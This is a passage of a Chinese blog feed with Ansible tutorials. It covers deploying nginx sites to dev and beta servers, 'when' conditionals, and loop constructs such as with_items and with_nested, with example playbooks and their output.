src=template/nginx-&#123;&#123; item &#125;&#125;.conf dest=/etc/nginx/conf.d/msf-&#123;&#123; item &#125;&#125;-api.conf</span><br><span class="line">       with_items:</span><br><span class="line">          - open</span><br><span class="line">          - internal        </span><br><span class="line">       notify: restart nginx</span><br><span class="line"></span><br><span class="line">     - name: copy nginx web file</span><br><span class="line">       copy: src=files/nginx-&#123;&#123; item &#125;&#125;.html dest=/data/apps/msf-&#123;&#123; item &#125;&#125;-api-&#123;&#123; dwd_env &#125;&#125;/index.html </span><br><span class="line">       with_items:</span><br><span class="line">         - open</span><br><span class="line">         - internal     </span><br><span class="line"></span><br><span class="line">     - name: start nginx</span><br><span class="line">       service: name=nginx state=started</span><br><span class="line"></span><br><span class="line">   handlers:</span><br><span class="line">     - name: restart nginx</span><br><span class="line">       service: name=nginx state=restarted</span><br></pre></td></tr></table></figure><p>执行完毕后,可以在两台节点上检查是否按我们需求创建正确的目录和文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 在beta环境服务上,创建了正确的目录结构和首页文件</span><br><span class="line"></span><br><span class="line">[root@localhost conf.d]# ll /data/apps/*</span><br><span class="line">/data/apps/msf-internal-api-beta:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 227 Aug  3 21:09 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 vendor</span><br><span class="line"></span><br><span class="line">/data/apps/msf-open-api-beta:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 226 Aug  3 21:09 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 vendor</span><br><span class="line"></span><br><span class="line">#创建了正确的beta环境的nginx虚拟主机配置文件</span><br><span class="line">[root@localhost conf.d]# cat msf-open-api.conf </span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">  server_name open.beta.msf.net;</span><br><span class="line">  root /data/apps/msf-open-api-beta/; # 站点根目录</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_open.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_open.access.log main;</span><br><span class="line"></span><br><span class="line">  # 如果URL中包含app.php，则转发为伪静态格式</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#其他文件检查过程略.</span><br></pre></td></tr></table></figure><p>在另外一台服务器上检查结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 创建了正确的dev环境目录:</span><br><span class="line">[root@localhost conf.d]$ll /data/apps/*</span><br><span class="line">/data/apps/msf-internal-api-dev:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 227 Sep  9 03:22 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 vendor</span><br><span class="line"></span><br><span class="line">/data/apps/msf-open-api-dev:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 226 Sep  9 03:22 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 vendor</span><br><span class="line"></span><br><span class="line">#创建了正确的nginx配置文件</span><br><span class="line"></span><br><span class="line">[root@localhost conf.d]$cat msf-open-api.conf </span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">  server_name open.dev.msf.net;</span><br><span class="line">  root /data/apps/msf-open-api-dev/; # 站点根目录</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_open.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_open.access.log main;</span><br><span class="line"></span><br><span class="line">  # 如果URL中包含app.php，则转发为伪静态格式</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见所有的目录和配置文件都按我们需求做到自动化部署,这为我们节省了大量的时间,工作效率大幅提升.而且也能很轻松的胜任更复杂的项目环境配置工作</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible-部署Nginx项目的playbook实践&quot;&gt;&lt;a href=&quot;#Ansible-部署Nginx项目的playbook实践&quot; class=&quot;headerlink&quot; title=&quot;Ansible 部署Nginx项目的playbook实践&quot;&gt;&lt;/a&gt;Ansible 部署Nginx项目的playbook实践&lt;/h2&gt;&lt;p&gt;工作中经常需要搭建项目的业务环境.需要部署同一套nginx站点业务在联调,测试,预发布,生产等各种不同环境的服务器上.这些工作主要包括两个部分:创建web资源目录,nginx站点配置.&lt;/p&gt;
&lt;p&gt;下面来看看如何使用playbook来自动化部署项目到不同环境的多台服务器上:&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible 条件选择</title>
    <link href="https://jesse.top/2018/08/29/Ansible/Ansible%20%E6%9D%A1%E4%BB%B6%E9%80%89%E6%8B%A9/"/>
    <id>https://jesse.top/2018/08/29/Ansible/Ansible 条件选择/</id>
    <published>2018-08-29T14:59:58.000Z</published>
    <updated>2018-12-01T14:50:12.540Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible-条件选择"><a href="#Ansible-条件选择" class="headerlink" title="Ansible 条件选择"></a>Ansible 条件选择</h2><p>playbook也可以像shell脚本的if语句那样,基于一个变量的结果来判断是否应该执行某个task.只是ansible的逻辑判断和语法上要别扭,复杂点.</p><a id="more"></a><hr><h3 id="when语句"><a href="#when语句" class="headerlink" title="when语句"></a>when语句</h3><p>when语句的条件判断使用非常简单,一般包含2种用法:</p><p>1.基于变量值来判断是否应该执行某个task:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   tasks:</span><br><span class="line">     - name: &quot;shutdown Debian flavored systems&quot;</span><br><span class="line">       file: path=/tmp/when state=touch</span><br><span class="line">       when: ansible_default_ipv4.address == &quot;10.0.4.230&quot;</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook when.yaml</span><br><span class="line"></span><br><span class="line">PLAY [all] *******************************************************************************************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] *******************************************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231]</span><br><span class="line">ok: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">TASK [shutdown Debian flavored systems] **************************************************************************************************************************************************************************</span><br><span class="line">skipping: [10.0.4.231]</span><br><span class="line">changed: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=1    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=1    changed=0    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><p>可以看到只在230这个IP上执行了动作.</p><p>另外,还可以基于or 或者 and的条件判断.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: &quot;shut down CentOS 6 and Debian 7 systems&quot;</span><br><span class="line">    command: /sbin/shutdown -t now</span><br><span class="line">    when: (ansible_distribution == &quot;CentOS&quot; and ansible_distribution_major_version == &quot;6&quot;) or</span><br><span class="line">          (ansible_distribution == &quot;Debian&quot; and ansible_distribution_major_version == &quot;7&quot;)</span><br></pre></td></tr></table></figure><p>或者and,同时满足2个条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: &quot;shut down CentOS 6 systems&quot;</span><br><span class="line">    command: /sbin/shutdown -t now</span><br><span class="line">    when:</span><br><span class="line">      - ansible_distribution == &quot;CentOS&quot;</span><br><span class="line">      - ansible_distribution_major_version == &quot;6&quot;</span><br></pre></td></tr></table></figure><blockquote><p>note: 也可以写成 when: ansible_distribution == “CentOS” and ansible_distribution_major_version == “6”</p></blockquote><p>2.基于某个task执行的成功与否作为条件.例如.执行 ls /home/work这个动作,来判断如果有这个文件,则创建个软链.此时就要忽略ls /home/work 这个动作可能出现错误(文件不存在).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   tasks:</span><br><span class="line">     - name: &quot;test file&quot;</span><br><span class="line">       command: ls /home/work</span><br><span class="line">       ignore_errors: True</span><br><span class="line">       register: result</span><br><span class="line"></span><br><span class="line">     - name: &quot;create link&quot;</span><br><span class="line">       file: src=/home/work dest=/tmp/work  state=link</span><br><span class="line">       when: result is succeeded</span><br><span class="line"></span><br><span class="line">     - name: &quot;create /tmp/home/work&quot;</span><br><span class="line">       file: src=/tmp/home/work state=directory</span><br><span class="line">       when: result is failed</span><br></pre></td></tr></table></figure><p>register注册一个result的变量,该变量是ls /home/work这个task的执行结果..然后when条件判断当result执行成功,或者执行失败时,才执行相应的task任务</p><hr><h3 id="when结合loop循环"><a href="#when结合loop循环" class="headerlink" title="when结合loop循环"></a>when结合loop循环</h3><p>变量注册的结果可以是字符串,布尔值,也可以是列表.使用”loop”或者”with_items”关键字可以对变量进行循环.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">- name: registered variable usage as a loop list</span><br><span class="line">  hosts: all</span><br><span class="line">  tasks:</span><br><span class="line"></span><br><span class="line">    - name: retrieve the list of home directories</span><br><span class="line">      command: ls /home</span><br><span class="line">      register: home_dirs</span><br><span class="line"></span><br><span class="line">    - name: add home dirs to the backup spooler</span><br><span class="line">      file:</span><br><span class="line">        path: /tmp/&#123;&#123; item &#125;&#125;</span><br><span class="line">        src: /home/&#123;&#123; item &#125;&#125;</span><br><span class="line">        state: link</span><br><span class="line">      loop: &quot;&#123;&#123; home_dirs.stdout_lines &#125;&#125;&quot;</span><br><span class="line">      # same as loop: &quot;&#123;&#123; home_dirs.stdout.split() &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ls /home</span><br><span class="line">jesse  tom  tony</span><br><span class="line">[root@localhost ~]# ls /tmp -l</span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 root root 11 Aug  3 10:57 jesse -&gt; /home/jesse</span><br><span class="line">lrwxrwxrwx 1 root root  9 Aug  3 10:57 tom -&gt; /home/tom</span><br><span class="line">lrwxrwxrwx 1 root root 10 Aug  3 10:57 tony -&gt; /home/tony</span><br></pre></td></tr></table></figure><hr><h3 id="when调用变量"><a href="#when调用变量" class="headerlink" title="when调用变量"></a>when调用变量</h3><p>有时候when也需要对2个变量来进行比较,判断是否满足条件.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- hosts: dev beta</span><br><span class="line">   remote_user: root</span><br><span class="line">   vars:</span><br><span class="line">     server_group: hsq</span><br><span class="line">      openapi: trade</span><br><span class="line">      internalapi:</span><br><span class="line">   </span><br><span class="line">       - name: create api site dir</span><br><span class="line">         file: path=&#123;&#123; nginx_site_dir &#125;&#125;/&#123;&#123; project_name &#125;&#125;-&#123;&#123; item[0] &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=work group=work mode=0775 state=directory</span><br><span class="line">         with_nested:</span><br><span class="line">              - [ &quot;&#123;&#123; openapi &#125;&#125;&quot;,&quot;&#123;&#123; internalapi &#125;&#125;&quot;]</span><br><span class="line">              - [&apos;releases&apos;,&apos;vendor&apos;,&apos;shared&apos;]</span><br><span class="line">         when:  inventory_hostname in groups[ server_group ]</span><br></pre></td></tr></table></figure><p>上面的when语句表示,只有在变量server_group主机组的主机才满足条件.这里不能像其他地方一样用双大括号的方式来调用变量.否则会出现如下错误:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[WARNING]: when statements should not include jinja2 templating delimiters such as &#123;&#123; &#125;&#125; or &#123;% %&#125;. Found: inventory_hostname in groups[ &apos;&#123;&#123; server_group &#125;&#125;&apos; ]</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible-条件选择&quot;&gt;&lt;a href=&quot;#Ansible-条件选择&quot; class=&quot;headerlink&quot; title=&quot;Ansible 条件选择&quot;&gt;&lt;/a&gt;Ansible 条件选择&lt;/h2&gt;&lt;p&gt;playbook也可以像shell脚本的if语句那样,基于一个变量的结果来判断是否应该执行某个task.只是ansible的逻辑判断和语法上要别扭,复杂点.&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>ansible--loop循环</title>
    <link href="https://jesse.top/2018/08/28/Ansible/ansible--loop%E5%BE%AA%E7%8E%AF/"/>
    <id>https://jesse.top/2018/08/28/Ansible/ansible--loop循环/</id>
    <published>2018-08-28T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ansible–loop循环"><a href="#ansible–loop循环" class="headerlink" title="ansible–loop循环"></a>ansible–loop循环</h2><h4 id="标准循环"><a href="#标准循环" class="headerlink" title="标准循环"></a>标准循环</h4><ul><li>下面是一个简单的标准loop循环的例子:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim loop-useradd.yaml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  tasks:</span><br><span class="line">    - name: add several users</span><br><span class="line">      user:</span><br><span class="line">         name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">         state: present</span><br><span class="line">         groups: &quot;wheel&quot;</span><br><span class="line">      loop:</span><br><span class="line">         - testuser1</span><br><span class="line">         - testuser2</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li>如果变量是一个Yaml列表,则可以循环这个列表:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loop: &quot;&#123;&#123; somelist &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>所以上面的例子也可以改成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  tasks:</span><br><span class="line">    - name: add several users</span><br><span class="line">      user:</span><br><span class="line">         name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">         state: present</span><br><span class="line">         groups: &quot;wheel&quot;</span><br><span class="line">      loop: [ testuser3,testuser4]</span><br></pre></td></tr></table></figure><p>循环实际上相当于下面的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- name: add user testuser1</span><br><span class="line">  user:</span><br><span class="line">    name: &quot;testuser1&quot;</span><br><span class="line">    state: present</span><br><span class="line">    groups: &quot;wheel&quot;</span><br><span class="line">- name: add user testuser2</span><br><span class="line">  user:</span><br><span class="line">    name: &quot;testuser2&quot;</span><br><span class="line">    state: present</span><br><span class="line">    groups: &quot;wheel&quot;</span><br></pre></td></tr></table></figure><ul><li>也可以循环一个字典,例如:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- name: add several users</span><br><span class="line">  user:</span><br><span class="line">    name: &quot;&#123;&#123; item.name &#125;&#125;&quot;</span><br><span class="line">    state: present</span><br><span class="line">    groups: &quot;&#123;&#123; item.groups &#125;&#125;&quot;</span><br><span class="line">  loop:</span><br><span class="line">    - &#123; name: &apos;testuser1&apos;, groups: &apos;wheel&apos; &#125;</span><br><span class="line">    - &#123; name: &apos;testuser2&apos;, groups: &apos;root&apos; &#125;</span><br></pre></td></tr></table></figure><hr><h4 id="loop与yum-apt"><a href="#loop与yum-apt" class="headerlink" title="loop与yum,apt"></a>loop与yum,apt</h4><p>有一些模块有自带列表循环功能,这比使用loop循环更好,例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim loop-yum.yaml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  tasks:</span><br><span class="line">   - name: optimal yum</span><br><span class="line">     yum:</span><br><span class="line">       name: [httpd,nginx,iotop]</span><br><span class="line">       state: present</span><br></pre></td></tr></table></figure><p>这比使用下面的loop循环语句要更好,因为loop循环可能会有Yum安装软件的依赖问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- name: non optimal yum, not only slower but might cause issues with interdependencies</span><br><span class="line">  yum:</span><br><span class="line">    name: &quot;&#123;&#123;item&#125;&#125;&quot;</span><br><span class="line">    state: present</span><br><span class="line">  loop: &quot;&#123;&#123;list_of_packages&#125;&#125;&quot;</span><br></pre></td></tr></table></figure><hr><h4 id="with-items迭代"><a href="#with-items迭代" class="headerlink" title="with_items迭代"></a>with_items迭代</h4><p>ansible默认使用item作为循环迭代变量名,with_items列出了一个items的列表.迭代的传递值给变量.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-name: install apt packages</span><br><span class="line"> apt: pkg=&#123;&#123;item&#125;&#125; update_cache=yes cache_valid_time=3600</span><br><span class="line"> sudo: True</span><br><span class="line"> with_items:</span><br><span class="line">    - git</span><br><span class="line">    - libjpeg-dev</span><br><span class="line">    - libpq-dev</span><br><span class="line">    - memcached</span><br><span class="line">    - nginx</span><br><span class="line">    - postgresql</span><br></pre></td></tr></table></figure><blockquote><p>在apt,yum等模块中,使用with_items语句安装软件包效率更高,这是因为ansible会将整个软件包的列表一起传递给apt,yum模块,相当于只调用一次apt,yum命令</p></blockquote><hr><h4 id="嵌套循环"><a href="#嵌套循环" class="headerlink" title="嵌套循环"></a>嵌套循环</h4><p>如果一个模块要使用2个循环那该怎么办.在前一个循环的基础上,再进行一次循环时,就可以使用嵌套循环.</p><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- name: create project dir</span><br><span class="line">  file: path=/data/apps/msf-&#123;&#123; item[0] &#125;&#125;-api-&#123;&#123; dwd_env &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=root group=root mode=0644 state=directory</span><br><span class="line">  with_nested:</span><br><span class="line">    - [&apos;open&apos;,&apos;internal&apos;]</span><br><span class="line">    - [&apos;releases&apos;,&apos;vendor&apos;,&apos;shared&apos;]</span><br></pre></td></tr></table></figure><p>  item[0]表示循环’open’,’internal’.在每次循环item[0]时都循环一遍item[1],也就是’release,vendor,shared.<br>   上面的循环语句其实类似于shell的命令:<br>   mkdir -pv /data/apps/msf-{open,internal}-api/{releases,vendor,shared}</p><hr><h3 id="列表循环"><a href="#列表循环" class="headerlink" title="列表循环"></a>列表循环</h3><p>有时候循环不适合写死变量.因为万一变量没有值的话,就需要改写playbook里的task.这是非常不方便的.</p><p>比如:如果下面的openapi变量没有值,或者如果不需要新建这个目录,就需要修改这个task.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file: path=&#123;&#123; nginx_site_dir &#125;&#125;/&#123;&#123; project_name &#125;&#125;-&#123;&#123; item[0] &#125;&#125;-&#123;&#123; dwd_env &#125;&#125;/&#123;&#123; item[1] &#125;&#125;/vendor recurse=yes owner=work group=work mode=0775 state=directory</span><br><span class="line">with_nested:</span><br><span class="line">      - [ &quot;&#123;&#123; openapi &#125;&#125;&quot;,&quot; &#123;&#123; xxx &#125;&#125;,&quot;&#123;&#123; haha &#125;&#125;&quot;&quot;]</span><br><span class="line">      - [&apos;releases&apos;,&apos;shared&apos;]</span><br></pre></td></tr></table></figure><p>此时列表循环就非常有帮助.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vars:</span><br><span class="line">   api:</span><br><span class="line">     - openapi</span><br><span class="line">     - internal</span><br><span class="line">     - script</span><br><span class="line">     </span><br><span class="line">tasks:</span><br><span class="line"></span><br><span class="line">   - name: create dev beta project dir</span><br><span class="line">     file: path=/tmp/hsq-&#123;&#123; item[0] &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=work group=work mode=0775 state=directory</span><br><span class="line">     with_nested:</span><br><span class="line">         - &quot;&#123;&#123; api &#125;&#125;&quot;</span><br><span class="line">         - [&apos;releases&apos;,&apos;shared&apos;]</span><br></pre></td></tr></table></figure><p> 这样一来只需要修改api的变量,而不需要修改playbook的task.</p><p> 执行结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TASK [create dev beta project dir] *********************************************************************************************************************************************</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;openapi&apos;, u&apos;releases&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;openapi&apos;, u&apos;shared&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;internal&apos;, u&apos;releases&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;internal&apos;, u&apos;shared&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;script&apos;, u&apos;releases&apos;])</span><br><span class="line">changed: [docker] =&gt; (item=[u&apos;script&apos;, u&apos;shared&apos;])</span><br><span class="line"></span><br><span class="line">PLAY RECAP *********************************************************************************************************************************************************************</span><br><span class="line">docker                     : ok=2    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ansible–loop循环&quot;&gt;&lt;a href=&quot;#ansible–loop循环&quot; class=&quot;headerlink&quot; title=&quot;ansible–loop循环&quot;&gt;&lt;/a&gt;ansible–loop循环&lt;/h2&gt;&lt;h4 id=&quot;标准循环&quot;&gt;&lt;a href=&quot;#标准循环&quot; class=&quot;headerlink&quot; title=&quot;标准循环&quot;&gt;&lt;/a&gt;标准循环&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;下面是一个简单的标准loop循环的例子:&lt;/li&gt;
&lt;/ul&gt;
